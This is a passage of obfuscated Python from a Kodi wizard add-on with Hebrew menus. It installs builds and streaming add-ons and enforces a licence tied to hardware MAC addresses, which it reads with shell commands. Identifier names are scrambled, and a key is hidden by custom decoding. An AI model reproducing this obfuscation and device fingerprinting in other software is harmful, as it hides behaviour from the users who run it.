							OO0O0O000O0O00O00 =OO0O0O000O0O00O00 [:OO0O0O000O0O00O00 .find (">")]#line:1716
					O00O000OO00000OOO .append (OO0O0O000O0O00O00 .strip ())#line:1718
			O0O00O000O00OO000 =O00O000OO00000OOO #line:1719
		else :#line:1720
			O00O000OO00000OOO =[]#line:1721
			for OOO00OOOOO0O0OOO0 in O0O00O000O00OO000 :#line:1722
				O0OOOO00OO0OO0O0O =u"</"+name #line:1723
				OOO00OO0OOOO0O0O0 =O00OO000O0OO0OOOO .find (OOO00OOOOO0O0OOO0 )#line:1725
				O0000OO0O00O0O0O0 =O00OO000O0OO0OOOO .find (O0OOOO00OO0OO0O0O ,OOO00OO0OOOO0O0O0 )#line:1726
				O00O0O0OOO00O0OOO =O00OO000O0OO0OOOO .find ("<"+name ,OOO00OO0OOOO0O0O0 +1 )#line:1727
				while O00O0O0OOO00O0OOO <O0000OO0O00O0O0O0 and O00O0O0OOO00O0OOO !=-1 :#line:1729
					O0O00O0O0O00O0O00 =O00OO000O0OO0OOOO .find (O0OOOO00OO0OO0O0O ,O0000OO0O00O0O0O0 +len (O0OOOO00OO0OO0O0O ))#line:1730
					if O0O00O0O0O00O0O00 !=-1 :#line:1731
						O0000OO0O00O0O0O0 =O0O00O0O0O00O0O00 #line:1732
					O00O0O0OOO00O0OOO =O00OO000O0OO0OOOO .find ("<"+name ,O00O0O0OOO00O0OOO +1 )#line:1733
				if OOO00OO0OOOO0O0O0 ==-1 and O0000OO0O00O0O0O0 ==-1 :#line:1735
					OOO000OO0000O00O0 =u""#line:1736
				elif OOO00OO0OOOO0O0O0 >-1 and O0000OO0O00O0O0O0 >-1 :#line:1737
					OOO000OO0000O00O0 =O00OO000O0OO0OOOO [OOO00OO0OOOO0O0O0 +len (OOO00OOOOO0O0OOO0 ):O0000OO0O00O0O0O0 ]#line:1738
				elif O0000OO0O00O0O0O0 >-1 :#line:1739
					OOO000OO0000O00O0 =O00OO000O0OO0OOOO [:O0000OO0O00O0O0O0 ]#line:1740
				elif OOO00OO0OOOO0O0O0 >-1 :#line:1741
					OOO000OO0000O00O0 =O00OO000O0OO0OOOO [OOO00OO0OOOO0O0O0 +len (OOO00OOOOO0O0OOO0 ):]#line:1742
				if ret :#line:1744
					O0OOOO00OO0OO0O0O =O00OO000O0OO0OOOO [O0000OO0O00O0O0O0 :O00OO000O0OO0OOOO .find (">",O00OO000O0OO0OOOO .find (O0OOOO00OO0OO0O0O ))+1 ]#line:1745
					OOO000OO0000O00O0 =OOO00OOOOO0O0OOO0 +OOO000OO0000O00O0 +O0OOOO00OO0OO0O0O #line:1746
				O00OO000O0OO0OOOO =O00OO000O0OO0OOOO [O00OO000O0OO0OOOO .find (OOO000OO0000O00O0 ,O00OO000O0OO0OOOO .find (OOO00OOOOO0O0OOO0 ))+len (OOO000OO0000O00O0 ):]#line:1748
				O00O000OO00000OOO .append (OOO000OO0000O00O0 )#line:1749
			O0O00O000O00OO000 =O00O000OO00000OOO #line:1750
		OOO000OO0O0000O00 +=O0O00O000O00OO000 #line:1751
	return OOO000OO0O0000O00 #line:1753
def addItem (OO0OOOO0O0O000O00 ,O00O00OOO0O0O000O ,OO0O0O0OO00000000 ,O0OOOOOO0O0OOOOOO ,O0000OO0OO0000O00 ,description =None ):#line:1755
	if description ==None :description =''#line:1756
	description ='[COLOR white]'+description +'[/COLOR]'#line:1757
	O0O0000OOOO000000 =sys .argv [0 ]+"?url="+urllib .quote_plus (O00O00OOO0O0O000O )+"&mode="+str (OO0O0O0OO00000000 )+"&name="+urllib .quote_plus (OO0OOOO0O0O000O00 )+"&iconimage="+urllib .quote_plus (O0OOOOOO0O0OOOOOO )+"&fanart="+urllib .quote_plus (O0000OO0OO0000O00 )#line:1758
	O0OOO00OOOO000O00 =True #line:1759
	O0OO00OOO0OO0OO00 =xbmcgui .ListItem (OO0OOOO0O0O000O00 ,iconImage =O0OOOOOO0O0OOOOOO ,thumbnailImage =O0OOOOOO0O0OOOOOO )#line:1760
	O0OO00OOO0OO0OO00 .setInfo (type ="Video",infoLabels ={"Title":OO0OOOO0O0O000O00 ,"Plot":description })#line:1761
	O0OO00OOO0OO0OO00 .setProperty ("fanart_Image",O0000OO0OO0000O00 )#line:1762
	O0OO00OOO0OO0OO00 .setProperty ("icon_Image",O0OOOOOO0O0OOOOOO )#line:1763
	O0OOO00OOOO000O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0000OOOO000000 ,listitem =O0OO00OOO0OO0OO00 ,isFolder =False )#line:1764
	return O0OOO00OOOO000O00 #line:1765
def get_params ():#line:1767
		OO0O00OOOO00O0000 =[]#line:1768
		O0O0O000000OOOOOO =sys .argv [2 ]#line:1769
		if len (O0O0O000000OOOOOO )>=2 :#line:1770
				O0O0OO000O00000O0 =sys .argv [2 ]#line:1771
				O00OO000OO00O0OO0 =O0O0OO000O00000O0 .replace ('?','')#line:1772
				if (O0O0OO000O00000O0 [len (O0O0OO000O00000O0 )-1 ]=='/'):#line:1773
						O0O0OO000O00000O0 =O0O0OO000O00000O0 [0 :len (O0O0OO000O00000O0 )-2 ]#line:1774
				O000OOO000OOOOO0O =O00OO000OO00O0OO0 .split ('&')#line:1775
				OO0O00OOOO00O0000 ={}#line:1776
				for OO0O0OO000OO0000O in range (len (O000OOO000OOOOO0O )):#line:1777
						O00OOO00OO0OO0O0O ={}#line:1778
						O00OOO00OO0OO0O0O =O000OOO000OOOOO0O [OO0O0OO000OO0000O ].split ('=')#line:1779
						if (len (O00OOO00OO0OO0O0O ))==2 :#line:1780
								OO0O00OOOO00O0000 [O00OOO00OO0OO0O0O [0 ]]=O00OOO00OO0OO0O0O [1 ]#line:1781
		return OO0O00OOOO00O0000 #line:1783
def decode (OO00000OO00OO00OO ,OO0O0O00O0O0OOO00 ):#line:1788
    import base64 #line:1789
    OOO00O0OO0OOOO0OO =[]#line:1790
    if (len (OO00000OO00OO00OO ))!=4 :#line:1792
     return 10 #line:1793
    OO0O0O00O0O0OOO00 =base64 .urlsafe_b64decode (OO0O0O00O0O0OOO00 )#line:1794
    for O00000O0O0OOOO00O in range (len (OO0O0O00O0O0OOO00 )):#line:1796
        O0OO0OO0OO0O00OOO =OO00000OO00OO00OO [O00000O0O0OOOO00O %len (OO00000OO00OO00OO )]#line:1797
        OO0O0O00OO0OOO0O0 =chr ((256 +ord (OO0O0O00O0O0OOO00 [O00000O0O0OOOO00O ])-ord (O0OO0OO0OO0O00OOO ))%256 )#line:1798
        OOO00O0OO0OOOO0OO .append (OO0O0O00OO0OOO0O0 )#line:1799
    return "".join (OOO00O0OO0OOOO0OO )#line:1800
def tmdb_list (OO0000O0O00OOO000 ):#line:1801
    O0O00OOO0OOO0O0OO =decode ("7643",OO0000O0O00OOO000 )#line:1804
    return int (O0O00OOO0OOO0O0OO )#line:1807
def u_list (OO000O00OOOOO000O ):#line:1808
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1810
        from math import sqrt #line:1811
        OO000OOO00O0O00O0 =tmdb_list (TMDB_NEW_API )#line:1812
        OO0O0000OOOOO0OO0 =str ((getHwAddr ('eth0'))*OO000OOO00O0O00O0 )#line:1814
        O0O00O000000O0OO0 =int (OO0O0000OOOOO0OO0 [1 ]+OO0O0000OOOOO0OO0 [2 ]+OO0O0000OOOOO0OO0 [5 ]+OO0O0000OOOOO0OO0 [7 ])#line:1815
        O00OOO00OO0O00000 =(ADDON .getSetting ("pass"))#line:1817
        O0OO0OO0000OOOOOO =(str (round (sqrt ((O0O00O000000O0OO0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1822
        if '.'in O0OO0OO0000OOOOOO :#line:1824
         O0OO0OO0000OOOOOO =(str (round (sqrt ((O0O00O000000O0OO0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1825
        if O00OOO00OO0O00000 ==O0OO0OO0000OOOOOO :#line:1827
          O00OOO0OO0OOO000O =OO000O00OOOOO000O #line:1829
        else :#line:1831
           if STARTP2 ()and STARTP ()=='ok':#line:1832
             return OO000O00OOOOO000O #line:1835
           O00OOO0OO0OOO000O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1836
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1837
           sys .exit ()#line:1838
        return O00OOO0OO0OOO000O #line:1839
    else :#line:1840
        STARTP ()#line:1841
def disply_hwr ():#line:1845
   try :#line:1846
    OOOOO0OO00O0OOO00 =tmdb_list (TMDB_NEW_API )#line:1847
    OOOO0O0O0OO00O00O =str ((getHwAddr ('eth0'))*OOOOO0OO00O0OOO00 )#line:1848
    O0OO0OOOO00O0000O =(OOOO0O0O0OO00O00O [1 ]+OOOO0O0O0OO00O00O [2 ]+OOOO0O0O0OO00O00O [5 ]+OOOO0O0O0OO00O00O [7 ])#line:1855
    OOO0OOOOOOOO0O0O0 =(ADDON .getSetting ("action"))#line:1856
    wiz .setS ('action',str (O0OO0OOOO00O0000O ))#line:1858
   except :pass #line:1859
def disply_hwr2 ():#line:1860
   try :#line:1861
    OO00OO0O0OO0OO0O0 =tmdb_list (TMDB_NEW_API )#line:1862
    OO0O0OOO000O00000 =str ((getHwAddr ('eth0'))*OO00OO0O0OO0OO0O0 )#line:1864
    OOOOOO0OOOOO0OOOO =(OO0O0OOO000O00000 [1 ]+OO0O0OOO000O00000 [2 ]+OO0O0OOO000O00000 [5 ]+OO0O0OOO000O00000 [7 ])#line:1873
    O0O00O00O00O00000 =(ADDON .getSetting ("action"))#line:1874
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOOOO0OOOOO0OOOO )#line:1877
   except :pass #line:1878
def getHwAddr (O00O0O0OO0O0OO0OO ):#line:1880
   import subprocess ,time #line:1881
   OO0O000O0O000OOOO ='windows'#line:1882
   if xbmc .getCondVisibility ('system.platform.android'):#line:1883
       OO0O000O0O000OOOO ='android'#line:1884
   if xbmc .getCondVisibility ('system.platform.android'):#line:1885
     O00OO0O0OOOO00000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1886
     O0OOOO0OO0OO0OOO0 =re .compile ('link/ether (.+?) brd').findall (str (O00OO0O0OOOO00000 ))#line:1888
     OOOO0O0OOOO00O00O =0 #line:1889
     for O00O0O000O0000000 in O0OOOO0OO0OO0OOO0 :#line:1890
      if O0OOOO0OO0OO0OOO0 !='00:00:00:00:00:00':#line:1891
          OO0O00O00OO0OO00O =O00O0O000O0000000 #line:1892
          OOOO0O0OOOO00O00O =OOOO0O0OOOO00O00O +int (OO0O00O00OO0OO00O .replace (':',''),16 )#line:1893
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1895
       OOO00OOOO00OO0O00 =0 #line:1896
       OOOO0O0OOOO00O00O =0 #line:1897
       O0OOOOOO0OO000000 =[]#line:1898
       O0O000OOOO0OOO000 =os .popen ("getmac").read ()#line:1899
       O0O000OOOO0OOO000 =O0O000OOOO0OOO000 .split ("\n")#line:1900
       for O0O0O00O0OOO00OOO in O0O000OOOO0OOO000 :#line:1902
            O0OO0OOOOOOOO000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0O0O00O0OOO00OOO ,re .I )#line:1903
            if O0OO0OOOOOOOO000O :#line:1904
                O0OOOO0OO0OO0OOO0 =O0OO0OOOOOOOO000O .group ().replace ('-',':')#line:1905
                O0OOOOOO0OO000000 .append (O0OOOO0OO0OO0OOO0 )#line:1906
                OOOO0O0OOOO00O00O =OOOO0O0OOOO00O00O +int (O0OOOO0OO0OO0OOO0 .replace (':',''),16 )#line:1909
   else :#line:1911
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1912
   try :#line:1929
    return OOOO0O0OOOO00O00O #line:1930
   except :pass #line:1931
def getpass ():#line:1932
	disply_hwr2 ()#line:1934
def setpass ():#line:1935
    OO0O0OOOOOO000OOO =xbmcgui .Dialog ()#line:1936
    O0O0OOO0OO0OO0OOO =''#line:1937
    O0O0000O0000O0000 =xbmc .Keyboard (O0O0OOO0OO0OO0OOO ,'הכנס סיסמה')#line:1939
    O0O0000O0000O0000 .doModal ()#line:1940
    if O0O0000O0000O0000 .isConfirmed ():#line:1941
           O0O0000O0000O0000 =O0O0000O0000O0000 .getText ()#line:1942
    wiz .setS ('pass',str (O0O0000O0000O0000 ))#line:1943
def setuname ():#line:1944
    O0O0O0OOOO000OO0O =''#line:1945
    OOOOO000OOO0O00OO =xbmc .Keyboard (O0O0O0OOOO000OO0O ,'הכנס שם משתמש')#line:1946
    OOOOO000OOO0O00OO .doModal ()#line:1947
    if OOOOO000OOO0O00OO .isConfirmed ():#line:1948
           O0O0O0OOOO000OO0O =OOOOO000OOO0O00OO .getText ()#line:1949
           wiz .setS ('user',str (O0O0O0OOOO000OO0O ))#line:1950
def powerkodi ():#line:1951
    os ._exit (1 )#line:1952
def buffer1 ():#line:1954
	O00OOOO000OO0OOO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1955
	OOOO0O00OOOOOO00O =xbmc .getInfoLabel ("System.Memory(total)")#line:1956
	O0OOO0OO00O000O00 =xbmc .getInfoLabel ("System.FreeMemory")#line:1957
	O00OOO0OOO00O0OO0 =re .sub ('[^0-9]','',O0OOO0OO00O000O00 )#line:1958
	O00OOO0OOO00O0OO0 =int (O00OOO0OOO00O0OO0 )/3 #line:1959
	OO0000OO00OOO0000 =O00OOO0OOO00O0OO0 *1024 *1024 #line:1960
	try :O0O0OOO000O000O00 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1961
	except :O0O0OOO000O000O00 =16 #line:1962
	OO000O00OOOOO00O0 =DIALOG .yesno ('FREE MEMORY: '+str (O0OOO0OO00O000O00 ),'Based on your free Memory your optimal buffersize is: '+str (O00OOO0OOO00O0OO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1965
	if OO000O00OOOOO00O0 ==1 :#line:1966
		with open (O00OOOO000OO0OOO0 ,"w")as O0O0O00OOO00O00O0 :#line:1967
			if O0O0OOO000O000O00 >=17 :O00000O0000O00OO0 =xml_data_advSettings_New (str (OO0000OO00OOO0000 ))#line:1968
			else :O00000O0000O00OO0 =xml_data_advSettings_old (str (OO0000OO00OOO0000 ))#line:1969
			O0O0O00OOO00O00O0 .write (O00000O0000O00OO0 )#line:1971
			DIALOG .ok ('Buffer Size Set to: '+str (OO0000OO00OOO0000 ),'Please restart Kodi for settings to apply.','')#line:1972
	elif OO000O00OOOOO00O0 ==0 :#line:1974
		OO0000OO00OOO0000 =_OO0OOOOO00OO00OOO (default =str (OO0000OO00OOO0000 ),heading ="INPUT BUFFER SIZE")#line:1975
		with open (O00OOOO000OO0OOO0 ,"w")as O0O0O00OOO00O00O0 :#line:1976
			if O0O0OOO000O000O00 >=17 :O00000O0000O00OO0 =xml_data_advSettings_New (str (OO0000OO00OOO0000 ))#line:1977
			else :O00000O0000O00OO0 =xml_data_advSettings_old (str (OO0000OO00OOO0000 ))#line:1978
			O0O0O00OOO00O00O0 .write (O00000O0000O00OO0 )#line:1979
			DIALOG .ok ('Buffer Size Set to: '+str (OO0000OO00OOO0000 ),'Please restart Kodi for settings to apply.','')#line:1980
def xml_data_advSettings_old (OO0O000O00OOO00O0 ):#line:1981
	O000O0O0O0O00OOO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0O000O00OOO00O0 #line:1991
	return O000O0O0O0O00OOO0 #line:1992
def xml_data_advSettings_New (OO000O0OO000O0000 ):#line:1994
	OO0O0O0O0OO0OO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO000O0OO000O0000 #line:2006
	return OO0O0O0O0OO0OO00O #line:2007
def write_ADV_SETTINGS_XML (OO000000O000O00O0 ):#line:2008
    if not os .path .exists (xml_file ):#line:2009
        with open (xml_file ,"w")as O00000OOO0O0O000O :#line:2010
            O00000OOO0O0O000O .write (xml_data )#line:2011
def _OO0OOOOO00OO00OOO (default ="",heading ="",hidden =False ):#line:2012
    ""#line:2013
    O0OO0O0OO0O0000OO =xbmc .Keyboard (default ,heading ,hidden )#line:2014
    O0OO0O0OO0O0000OO .doModal ()#line:2015
    if (O0OO0O0OO0O0000OO .isConfirmed ()):#line:2016
        return unicode (O0OO0O0OO0O0000OO .getText (),"utf-8")#line:2017
    return default #line:2018
def index ():#line:2020
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2021
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2022
	if AUTOUPDATE =='Yes':#line:2023
		if wiz .workingURL (WIZARDFILE )==True :#line:2024
			OO00000O00OO000OO =wiz .checkWizard ('version')#line:2025
			if OO00000O00OO000OO >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO00000O00OO000OO ),'wizardupdate',themeit =THEME2 )#line:2026
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2028
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2029
	if len (BUILDNAME )>0 :#line:2030
		OO00O00O000OOO0O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2031
		O0O0OO0O0O0O0OO00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2032
		if OO00O00O000OOO0O0 >BUILDVERSION :O0O0OO0O0O0O0OO00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0OO0O0O0O0OO00 ,OO00O00O000OOO0O0 )#line:2033
		addDir (O0O0OO0O0O0O0OO00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2035
		try :#line:2037
		     O00O00OO00000OO00 =wiz .themeCount (BUILDNAME )#line:2038
		except :#line:2039
		   O00O00OO00000OO00 =False #line:2040
		if not O00O00OO00000OO00 ==False :#line:2041
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2042
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2043
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2048
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2052
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2054
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2056
def morsetup ():#line:2058
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2059
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2061
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2067
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2071
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2072
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2082
	setView ('files','viewType')#line:2083
def morsetup2 ():#line:2084
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2085
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
def fastupdate ():#line:2096
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2097
def forcefastupdate ():#line:2099
			O00O00OOOO0OOO0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2100
			wiz .ForceFastUpDate (ADDONTITLE ,O00O00OOOO0OOO0O0 )#line:2101
def rdsetup ():#line:2105
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2106
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2107
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2110
def traktsetup ():#line:2113
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	setView ('files','viewType')#line:2121
def setautorealdebrid ():#line:2122
    from resources .libs import real_debrid #line:2123
    O00000OO0OOOOO0O0 =real_debrid .RealDebridFirst ()#line:2124
    O00000OO0OOOOO0O0 .auth ()#line:2125
def setrealdebrid ():#line:2127
    O000OO00OO0000O00 =(ADDON .getSetting ("auto_rd"))#line:2128
    if O000OO00OO0000O00 =='false':#line:2129
       ADDON .openSettings ()#line:2130
    else :#line:2131
        from resources .libs import real_debrid #line:2132
        O00OOO00OOOOOO00O =real_debrid .RealDebrid ()#line:2133
        O00OOO00OOOOOO00O .auth ()#line:2134
        rdon ()#line:2137
def resolveurlsetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2140
def urlresolversetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2142
def placentasetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2145
def reptiliasetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2147
def flixnetsetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2149
def yodasetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2151
def numberssetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2153
def uranussetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2155
def genesissetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2157
def net_tools (view =None ):#line:2159
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2160
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2161
	setView ('files','viewType')#line:2163
def speedMenu ():#line:2164
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2165
def viewIP ():#line:2166
	O00OO0O0OOOO00OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2180
	O00O0O0000OOO00OO =[];OO000OOOO0OO0OOO0 =0 #line:2181
	for OOOOO0000OOOO0O0O in O00OO0O0OOOO00OO0 :#line:2182
		OO0O000O0000OOO0O =wiz .getInfo (OOOOO0000OOOO0O0O )#line:2183
		OO0000O000O0OO0O0 =0 #line:2184
		while OO0O000O0000OOO0O =="Busy"and OO0000O000O0OO0O0 <10 :#line:2185
			OO0O000O0000OOO0O =wiz .getInfo (OOOOO0000OOOO0O0O );OO0000O000O0OO0O0 +=1 ;wiz .log ("%s sleep %s"%(OOOOO0000OOOO0O0O ,str (OO0000O000O0OO0O0 )));xbmc .sleep (1000 )#line:2186
		O00O0O0000OOO00OO .append (OO0O000O0000OOO0O )#line:2187
		OO000OOOO0OO0OOO0 +=1 #line:2188
	OO00OOOOO0OOO0OO0 ,OO0000OOO00OO000O ,OO00O0000OOOOO00O =getIP ()#line:2189
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0000OOO00OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOOOO0OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOO00OO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0000OOOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0000OOO00OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	setView ('files','viewType')#line:2195
def buildMenu ():#line:2197
	if USERNAME =='':#line:2198
		ADDON .openSettings ()#line:2199
		sys .exit ()#line:2200
	if PASSWORD =='':#line:2201
		ADDON .openSettings ()#line:2202
	O0OO00OOOOO0OOO00 =u_list (SPEEDFILE )#line:2203
	(O0OO00OOOOO0OOO00 )#line:2204
	OO0000OOOOOOOOO00 =(wiz .workingURL (O0OO00OOOOO0OOO00 ))#line:2205
	(OO0000OOOOOOOOO00 )#line:2206
	OO0000OOOOOOOOO00 =wiz .workingURL (SPEEDFILE )#line:2207
	if not OO0000OOOOOOOOO00 ==True :#line:2208
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2209
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2210
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2211
